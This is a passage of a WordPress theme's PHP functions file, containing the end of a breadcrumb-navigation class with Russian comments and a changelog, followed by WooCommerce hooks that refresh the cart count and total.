            $out = $paged_num ? ( sprintf( $linkpatt, get_permalink($q_obj), esc_html($q_obj->post_title) ) . $pg_end ) : esc_html($q_obj->post_title);
        }
        elseif( is_404() ){
            $out = $loc->_404;
        }
        elseif( is_search() ){
            $out = sprintf( $loc->search, esc_html( $GLOBALS['s'] ) );
        }
        elseif( is_author() ){
            $tit = sprintf( $loc->author, esc_html($q_obj->display_name) );
            $out = ( $paged_num ? sprintf( $linkpatt, get_author_posts_url( $q_obj->ID, $q_obj->user_nicename ) . $pg_end, $tit ) : $tit );
        }
        elseif( is_year() || is_month() || is_day() ){
            $y_url  = get_year_link( $year = get_the_time('Y') );

            if( is_year() ){
                $tit = sprintf( $loc->year, $year );
                $out = ( $paged_num ? sprintf($linkpatt, $y_url, $tit) . $pg_end : $tit );
            }
            // month day
            else {
                $y_link = sprintf( $linkpatt, $y_url, $year);
                $m_url  = get_month_link( $year, get_the_time('m') );

                if( is_month() ){
                    $tit = sprintf( $loc->month, get_the_time('F') );
                    $out = $y_link . $sep . ( $paged_num ? sprintf( $linkpatt, $m_url, $tit ) . $pg_end : $tit );
                }
                elseif( is_day() ){
                    $m_link = sprintf( $linkpatt, $m_url, get_the_time('F'));
                    $out = $y_link . $sep . $m_link . $sep . get_the_time('l');
                }
            }
        }
        // Древовидные записи
        elseif( is_singular() && $ptype->hierarchical ){
            $out = $this->_add_title( $this->_page_crumbs($post), $post );
        }
        // Таксы, плоские записи и вложения
        else {
            $term = $q_obj; // таксономии

            // определяем термин для записей (включая вложения attachments)
            if( is_singular() ){
                // изменим $post, чтобы определить термин родителя вложения
                if( is_attachment() && $post->post_parent ){
                    $save_post = $post; // сохраним
                    $post = get_post($post->post_parent);
                }

                // учитывает если вложения прикрепляются к таксам древовидным - все бывает :)
                $taxonomies = get_object_taxonomies( $post->post_type );
                // оставим только древовидные и публичные, мало ли...
                $taxonomies = array_intersect( $taxonomies, get_taxonomies( array('hierarchical' => true, 'public' => true) ) );

                if( $taxonomies ){
                    // сортируем по приоритету
                    if( ! empty($arg->priority_tax) ){
                        usort( $taxonomies, function($a,$b)use($arg){
                            $a_index = array_search($a, $arg->priority_tax);
                            if( $a_index === false ) $a_index = 9999999;

                            $b_index = array_search($b, $arg->priority_tax);
                            if( $b_index === false ) $b_index = 9999999;

                            return ( $b_index === $a_index ) ? 0 : ( $b_index < $a_index ? 1 : -1 ); // меньше индекс - выше
                        } );
                    }

                    // пробуем получить термины, в порядке приоритета такс
                    foreach( $taxonomies as $taxname ){
                        if( $terms = get_the_terms( $post->ID, $taxname ) ){
                            // проверим приоритетные термины для таксы
                            $prior_terms = & $arg->priority_terms[ $taxname ];
                            if( $prior_terms && count($terms) > 2 ){
                                foreach( (array) $prior_terms as $term_id ){
                                    $filter_field = is_numeric($term_id) ? 'term_id' : 'slug';
                                    $_terms = wp_list_filter( $terms, array($filter_field=>$term_id) );

                                    if( $_terms ){
                                        $term = array_shift( $_terms );
                                        break;
                                    }
                                }
                            }
                            else
                                $term = array_shift( $terms );

                            break;
                        }
                    }
                }

                if( isset($save_post) ) $post = $save_post; // вернем обратно (для вложений)
            }

            // вывод

            // все виды записей с терминами или термины
            if( $term && isset($term->term_id) ){
                $term = apply_filters('kama_breadcrumbs_term', $term );

                // attachment
                if( is_attachment() ){
                    if( ! $post->post_parent )
                        $out = sprintf( $loc->attachment, esc_html($post->post_title) );
                    else {
                        if( ! $out = apply_filters('attachment_tax_crumbs', '', $term, $this ) ){
                            $_crumbs    = $this->_tax_crumbs( $term, 'self' );
                            $parent_tit = sprintf( $linkpatt, get_permalink($post->post_parent), get_the_title($post->post_parent) );
                            $_out = implode( $sep, array($_crumbs, $parent_tit) );
                            $out = $this->_add_title( $_out, $post );
                        }
                    }
                }
                // single
                elseif( is_single() ){
                    if( ! $out = apply_filters('post_tax_crumbs', '', $term, $this ) ){
                        $_crumbs = $this->_tax_crumbs( $term, 'self' );
                        $out = $this->_add_title( $_crumbs, $post );
                    }
                }
                // не древовидная такса (метки)
                elseif( ! is_taxonomy_hierarchical($term->taxonomy) ){
                    // метка
                    if( is_tag() )
                        $out = $this->_add_title('', $term, sprintf( $loc->tag, esc_html($term->name) ) );
                    // такса
                    elseif( is_tax() ){
                        $post_label = $ptype->labels->name;
                        $tax_label = $GLOBALS['wp_taxonomies'][ $term->taxonomy ]->labels->name;
                        $out = $this->_add_title('', $term, sprintf( $loc->tax_tag, $post_label, $tax_label, esc_html($term->name) ) );
                    }
                }
                // древовидная такса (рибрики)
                else {
                    if( ! $out = apply_filters('term_tax_crumbs', '', $term, $this ) ){
                        $_crumbs = $this->_tax_crumbs( $term, 'parent' );
                        $out = $this->_add_title( $_crumbs, $term, esc_html($term->name) );                     
                    }
                }
            }
            // влоежния от записи без терминов
            elseif( is_attachment() ){
                $parent = get_post($post->post_parent);
                $parent_link = sprintf( $linkpatt, get_permalink($parent), esc_html($parent->post_title) );
                $_out = $parent_link;

                // вложение от записи древовидного типа записи
                if( is_post_type_hierarchical($parent->post_type) ){
                    $parent_crumbs = $this->_page_crumbs($parent);
                    $_out = implode( $sep, array( $parent_crumbs, $parent_link ) );
                }

                $out = $this->_add_title( $_out, $post );
            }
            // записи без терминов
            elseif( is_singular() ){
                $out = $this->_add_title( '', $post );
            }
        }

        // замена ссылки на архивную страницу для типа записи
        $home_after = apply_filters('kama_breadcrumbs_home_after', '', $linkpatt, $sep, $ptype );

        if( '' === $home_after ){
            // Ссылка на архивную страницу типа записи для: отдельных страниц этого типа; архивов этого типа; таксономий связанных с этим типом.
            if( $ptype && $ptype->has_archive && ! in_array( $ptype->name, array('post','page','attachment') )
                && ( is_post_type_archive() || is_singular() || (is_tax() && in_array($term->taxonomy, $ptype->taxonomies)) )
            ){
                $pt_title = $ptype->labels->name;

                // первая страница архива типа записи
                if( is_post_type_archive() && ! $paged_num )
                    $home_after = sprintf( $this->arg->title_patt, $pt_title );
                // singular, paged post_type_archive, tax
                else{
                    $home_after = sprintf( $linkpatt, get_post_type_archive_link($ptype->name), $pt_title );

                    $home_after .= ( ($paged_num && ! is_tax()) ? $pg_end : $sep ); // пагинация
                }
            }
        }

        $before_out = sprintf( $linkpatt, home_url(), $loc->home ) . ( $home_after ? $sep.$home_after : ($out ? $sep : '') );

        $out = apply_filters('kama_breadcrumbs_pre_out', $out, $sep, $loc, $arg );

        $out = sprintf( $wrappatt, $before_out . $out );

        return apply_filters('kama_breadcrumbs', $out, $sep, $loc, $arg );
    }

    function _page_crumbs( $post ){
        $parent = $post->post_parent;

        $crumbs = array();
        while( $parent ){
            $page = get_post( $parent );
            $crumbs[] = sprintf( $this->arg->linkpatt, get_permalink($page), esc_html($page->post_title) );
            $parent = $page->post_parent;
        }

        return implode( $this->arg->sep, array_reverse($crumbs) );
    }

    function _tax_crumbs( $term, $start_from = 'self' ){
        $termlinks = array();
        $term_id = ($start_from === 'parent') ? $term->parent : $term->term_id;
        while( $term_id ){
            $term       = get_term( $term_id, $term->taxonomy );
            $termlinks[] = sprintf( $this->arg->linkpatt, get_term_link($term), esc_html($term->name) );
            $term_id    = $term->parent;
        }

        if( $termlinks )
            return implode( $this->arg->sep, array_reverse($termlinks) ) /*. $this->arg->sep*/;
        return '';
    }

    // добалвяет заголовок к переданному тексту, с учетом всех опций. Добавляет разделитель в начало, если надо.
    function _add_title( $add_to, $obj, $term_title = '' ){
        $arg = & $this->arg; // упростим...
        $title = $term_title ? $term_title : esc_html($obj->post_title); // $term_title чиститься отдельно, теги моугт быть...
        $show_title = $term_title ? $arg->show_term_title : $arg->show_post_title;

        // пагинация
        if( $arg->pg_end ){
            $link = $term_title ? get_term_link($obj) : get_permalink($obj);
            $add_to .= ($add_to ? $arg->sep : '') . sprintf( $arg->linkpatt, $link, $title ) . $arg->pg_end;
        }
        // дополняем - ставим sep
        elseif( $add_to ){
            if( $show_title )
                $add_to .= $arg->sep . sprintf( $arg->title_patt, $title );
            elseif( $arg->last_sep )
                $add_to .= $arg->sep;
        }
        // sep будет потом...
        elseif( $show_title )
            $add_to = sprintf( $arg->title_patt, $title );

        return $add_to;
    }

}

/**
 * Изменения:
 * 3.3 - новые хуки: attachment_tax_crumbs, post_tax_crumbs, term_tax_crumbs. Позволяют дополнить крошки таксономий.
 * 3.2 - баг с разделителем, с отключенным 'show_term_title'. Стабилизировал логику.
 * 3.1 - баг с esc_html() для заголовка терминов - с тегами получалось криво...
 * 3.0 - Обернул в класс. Добавил опции: 'title_patt', 'last_sep'. Доработал код. Добавил пагинацию для постов.
 * 2.5 - ADD: Опция 'show_term_title'
 * 2.4 - Мелкие правки кода
 * 2.3 - ADD: Страница записей, когда для главной установлена отделенная страница.
 * 2.2 - ADD: Link to post type archive on taxonomies page
 * 2.1 - ADD: $sep, $loc, $args params to hooks
 * 2.0 - ADD: в фильтр 'kama_breadcrumbs_home_after' добавлен четвертый аргумент $ptype
 * 1.9 - ADD: фильтр 'kama_breadcrumbs_default_loc' для изменения локализации по умолчанию
 * 1.8 - FIX: заметки, когда в рубрике нет записей
 * 1.7 - Улучшена работа с приоритетными таксономиями.
 */

add_filter('add_to_cart_fragments', 'header_add_to_cart_fragment');
add_filter('add_to_cart_fragments', 'header_add_to_cart_fragment_2');

function header_add_to_cart_fragment( $fragments ) {
    global $woocommerce;
    ob_start();
    ?>
    <i class="basket_count_fun"><?php echo sprintf($woocommerce->cart->cart_contents_count); ?></i>
    <?php
    $fragments['.basket_count_fun'] = ob_get_clean();
    return $fragments;
}

function header_add_to_cart_fragment_2( $fragments ) {
    global $woocommerce;
    ob_start();
    ?>
    <span class="basket__sum"><?php echo $woocommerce->cart->get_cart_total(); ?></span>
    <?php
    $fragments['.basket__sum'] = ob_get_clean();
    return $fragments;
}

remove_action( 'woocommerce_single_product_summary', 'woocommerce_template_single_add_to_cart', 30 );

add_action( 'woocommerce_single_product_summary', 'woocommerce_template_loop_add_to_cart', 30 );

?>
